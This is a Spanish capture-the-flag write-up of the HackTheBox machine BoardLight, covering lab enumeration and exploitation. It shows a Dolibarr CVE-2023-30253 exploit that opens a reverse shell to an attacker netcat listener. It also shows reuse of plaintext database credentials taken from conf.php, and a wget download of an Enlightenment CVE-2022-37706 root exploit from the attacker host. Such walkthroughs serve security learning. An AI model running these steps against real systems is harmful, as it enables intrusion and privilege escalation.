---
title: "BoardLight"
description: "Máquina BoardLight de Hackthebox"
date: 2024-10-04 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
  - Subdomain Enumeration
  - Dolibarr 17.0.0 Exploitation - CVE-2023-30253
  - Information Leakage (User Pivoting)
  - Enlightenment SUID Binary Exploitation [Privilege Escalation] 
image:
  path: /assets/img/BoardLight/BoardLight.png
---

## Skills

- Subdomain Enumeration
- Dolibarr 17.0.0 Exploitation - CVE-2023-30253
- Information Leakage (User Pivoting)
- Enlightenment SUID Binary Exploitation [Privilege Escalation]
  
## Certificaciones

- eWPT
- eJPT
  
## Descripción

`BoardLight` es una `máquina` de `Linux` de dificultad `fácil` que presenta una instancia de `Dolibarr` vulnerable a la `CVE-2023-30253`. Esta `vulnerabilidad` se aprovecha para obtener acceso como `www-data`. Después de `enumerar` y `volcar` los contenidos del `archivo de configuración web`, las `credenciales` en texto plano permiten acceder a la máquina por `SSH`. Al enumerar el `sistema`, se identifica un `binario SUID` relacionado con `enlightenment` que es vulnerable a la `escalada de privilegios` a través de la `CVE-2022-37706` y que puede ser explotado para obtener una `root shell`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping -c 3 10.129.231.37
PING 10.129.231.37 (10.129.231.37) 56(84) bytes of data.
64 bytes from 10.129.231.37: icmp_seq=1 ttl=63 time=36.1 ms
64 bytes from 10.129.231.37: icmp_seq=2 ttl=63 time=36.1 ms
64 bytes from 10.129.231.37: icmp_seq=3 ttl=63 time=41.2 ms

--- 10.129.231.37 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 36.090/37.786/41.152/2.380 mss
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap

```
#  sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.231.37 -oG openPorts
[sudo] password for justice-reaper: 
Sorry, try again.
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 14:57 CEST
Initiating SYN Stealth Scan at 14:57
Scanning 10.129.231.37 [65535 ports]
Discovered open port 22/tcp on 10.129.231.37
Discovered open port 80/tcp on 10.129.231.37
Completed SYN Stealth Scan at 14:57, 10.72s elapsed (65535 total ports)
Nmap scan report for 10.129.231.37
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.80 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p 22,80 10.129.231.37 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 15:03 CEST
Nmap scan report for 10.129.231.37
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.76 seconds
```

### Web Enumeration

Si accedemos al servicio web vemos esto

![](/assets/img/BoardLight/image_1.png)

`En la parte de abajo` de la `web` vemos un `dominio`

![](/assets/img/BoardLight/image_2.png)

Añadimos el dominio al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       kali-linux
10.129.231.37   board.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

`Fuzzeamos` y encontramos un `subdominio`

```
# wfuzz -c -t100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 404 --hh 15949 -H "Host: FUZZ.board.htb" http://board.htb     
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://board.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000072:   200        149 L    504 W      6360 Ch     "crm"     
```

Añadimos el subdominio al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       kali-linux
10.129.231.37   board.htb crm.board.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Nos encontramos ante un panel de autenticación de `Dolibarr 17.0.0`

![](/assets/img/BoardLight/image_3.png)

Si buscamos en google `Dolibarr default credentials` vemos que son `admin:admin`

![](/assets/img/BoardLight/image_4.png)

Nos `logueamos` en el panel `administrativo`

![](/assets/img/BoardLight/image_5.png)

## Web Exploitation

Nos `descargamos` este `exploit` [https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git) y nos ponemos en `escucha` con `netcat`

```
# nc -nlvp 4444
```

`Ejecutamos` el `exploit`

```
# python3 exploit.py http://crm.board.htb admin admin 10.10.16.28 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

`Recibimos` una `shell`

```
# nc -nlvp 4444                                
listening on [any] 4444 ...
connect to [10.10.16.28] from (UNKNOWN) [10.129.231.37] 33498
bash: cannot set terminal process group (872): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
```

Vamos a `realizar` el `tratamiento` a la `TTY`, para ello obtenemos las `dimensiones` de nuestra `pantalla`

```
# stty size
45 18
```

Efectuamos el `tratamiento` a la `TTY`

```
# script /dev/null -c bash
[ENTER]
[CTRL + Z]
# stty raw -echo; fg
[ENTER]
# reset xterm
[ENTER]
# export TERM=xterm
[ENTER]
# export SHELL=bash
[ENTER]
# stty rows 45 columns 183
[ENTER]
```

## Privilege Escalation

Buscamos en google `Dolibarr conf file path`

![](/assets/img/BoardLight/image_6.png)

Nos dirigimos a esa `ruta` y obtenemos unas `credenciales`

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ pwd
/var/www/html/crm.board.htb/htdocs/conf
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

Listamos los `usuarios` del `sistema` con `directorio home`

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
fwupd-refresh:x:128:135:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:129:65534::/run/sshd:/usr/sbin/nologin
```

Nos convertimos en el `usuario larissa`

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
Password: 
larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ whoami
larissa
```

Listamos `privilegios SUID` y me llama la atención el `binario enlightenment`

```
larissa@boardlight:/home$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

Listamos la `versión` de `enlightenment`

```
larissa@boardlight:~$ enlightenment --version
ESTART: 0.00046 [0.00046] - Begin Startup
ESTART: 0.00144 [0.00098] - Signal Trap
ESTART: 0.00145 [0.00001] - Signal Trap Done
ESTART: 0.00279 [0.00135] - Eina Init
ESTART: 0.00526 [0.00246] - Eina Init Done
ESTART: 0.00529 [0.00003] - Determine Prefix
ESTART: 0.00614 [0.00085] - Determine Prefix Done
ESTART: 0.00617 [0.00003] - Environment Variables
ESTART: 0.00619 [0.00002] - Environment Variables Done
ESTART: 0.00619 [0.00001] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```

Buscamos `exploits` para esta `versión` del `binario` y encontramos uno para versiones menores de la `0.25.3`

![](/assets/img/BoardLight/image_7.png)

Nos descargamos este `exploit` [https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git) en nuestro equipo y montamos un `servidor http` con `python` en la ruta en la que se encuentra el `exploit`

```
# python -m http.server 80
```

Nos descargamos el `exploit` en la `máquina víctima`

```
larissa@boardlight:~$ wget http://10.10.16.28/exploit.sh
--2024-10-11 06:27:09--  http://10.10.16.28/exploit.sh
Connecting to 10.10.16.28:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 709 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                        100%[=============================================================>]     709  --.-KB/s    in 0s      

2024-10-11 06:27:09 (75.2 MB/s) - ‘exploit.sh’ saved [709/709]
```

Ejecutamos el `exploit` y nos convertimos en `usuario root`

```
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```
